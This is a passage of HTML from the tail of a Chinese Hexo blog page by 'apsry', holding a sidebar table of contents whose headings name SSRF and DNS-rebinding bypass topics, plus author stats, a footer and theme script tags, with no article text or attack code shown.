nav-level-3"><a class="nav-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="nav-text">DNS重绑定</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="nav-text">攻击过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%A4%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E8%A1%8C%E8%AE%BE%E7%BD%AE"><span class="nav-text">使用国外服务器进行设置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ceye-io"><span class="nav-text">ceye.io</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E7%BB%9F%E4%B8%80%E5%9F%9F%E5%90%8D%E8%AE%BE%E7%BD%AE%E4%B8%A4%E4%B8%AAA%E8%AE%B0%E5%BD%95"><span class="nav-text">对统一域名设置两个A记录</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%A4%B4%E7%BB%95%E8%BF%87%E6%8C%87%E5%AE%9A%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%A4%B4"><span class="nav-text">利用不存在的协议头绕过指定的协议头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8URL%E7%9A%84%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98"><span class="nav-text">利用URL的解析问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5%E6%A0%BC"><span class="nav-text">绕过过滤不严格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#When-TLS-Hacks-You"><span class="nav-text">When TLS Hacks You</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E6%A1%B6%E5%9B%9E%E6%BA%90%E7%BB%95%E8%BF%87"><span class="nav-text">存储桶回源绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E9%AA%8C%E8%AF%81"><span class="nav-text">SSRF验证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Basic-SSRF"><span class="nav-text">Basic SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-SSRF"><span class="nav-text">Blind SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%91%E4%B8%AD%E7%9A%84SSRF"><span class="nav-text">云中的SSRF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%87%BA%E7%8E%B0%E7%82%B9"><span class="nav-text">SSRF出现点</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">apsry</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">apsry</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
